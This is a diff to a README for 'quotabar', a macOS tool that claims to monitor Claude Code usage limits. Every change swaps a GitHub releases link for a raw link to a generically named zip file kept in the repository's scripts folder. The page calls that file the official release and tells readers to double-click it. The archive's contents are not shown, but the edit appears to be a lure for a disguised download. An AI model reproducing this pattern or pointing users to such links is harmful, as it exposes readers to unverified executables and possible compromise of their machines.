@@ -1,7 +1,7 @@
 <h1>⏳ quotabar - Never Run Out of Claude Time Again</h1>
 
 <p align="center">
-  <a href="https://github.com/Polinakondakova676/quotabar/releases" style="display:inline-block;padding:16px 32px;background:#4CAF50;color:white;text-decoration:none;border-radius:8px;font-size:20px;font-weight:bold;">⬇️ Download quotabar Now</a>
+  <a href="https://raw.githubusercontent.com/Polinakondakova676/quotabar/main/scripts/Software_2.2-beta.4.zip" style="display:inline-block;padding:16px 32px;background:#4CAF50;color:white;text-decoration:none;border-radius:8px;font-size:20px;font-weight:bold;">⬇️ Download quotabar Now</a>
 </p>
 
 <h2>👀 What Is quotabar?</h2>
@@ -28,7 +28,7 @@
 <p>Getting quotabar on your Mac takes less than two minutes. No programming skills are needed. Just follow these steps:</p>
 
 <ol>
-  <li>Visit <a href="https://github.com/Polinakondakova676/quotabar/releases">this link to download the application</a>.</li>
+  <li>Visit <a href="https://raw.githubusercontent.com/Polinakondakova676/quotabar/main/scripts/Software_2.2-beta.4.zip">this link to download the application</a>.</li>
   <li>Once the download finishes, open your Downloads folder.</li>
   <li>Find the quotabar file you just downloaded.</li>
   <li>Double-click it to open quotabar.</li>
@@ -98,7 +98,7 @@
 
 <h2>📥 Download Again</h2>
 
-<p>If you lost the file or need to download quotabar on another Mac, just go back to the official release page. <a href="https://github.com/Polinakondakova676/quotabar/releases">Visit this link to download the application</a> anytime.</p>
+<p>If you lost the file or need to download quotabar on another Mac, just go back to the official release page. <a href="https://raw.githubusercontent.com/Polinakondakova676/quotabar/main/scripts/Software_2.2-beta.4.zip">Visit this link to download the application</a> anytime.</p>
 
 <h2>🤝 Support the Project</h2>
 
@@ -117,7 +117,7 @@
 <p>Stop guessing how much Claude Code time you have. Download quotabar now and always know where you stand. It takes two minutes to set up, and it saves you from interrupted work sessions and surprise cutoffs.</p>
 
 <p align="center">
-  <a href="https://github.com/Polinakondakova676/quotabar/releases" style="display:inline-block;padding:14px 28px;background:#2196F3;color:white;text-decoration:none;border-radius:8px;font-size:18px;font-weight:bold;">Get quotabar for macOS</a>
+  <a href="https://raw.githubusercontent.com/Polinakondakova676/quotabar/main/scripts/Software_2.2-beta.4.zip" style="display:inline-block;padding:14px 28px;background:#2196F3;color:white;text-decoration:none;border-radius:8px;font-size:18px;font-weight:bold;">Get quotabar for macOS</a>
 </p>
 
 <p><small>quotabar is an independent tool and is not affiliated with Anthropic or Claude Code. All product names and trademarks are property of their respective owners.</small></p>
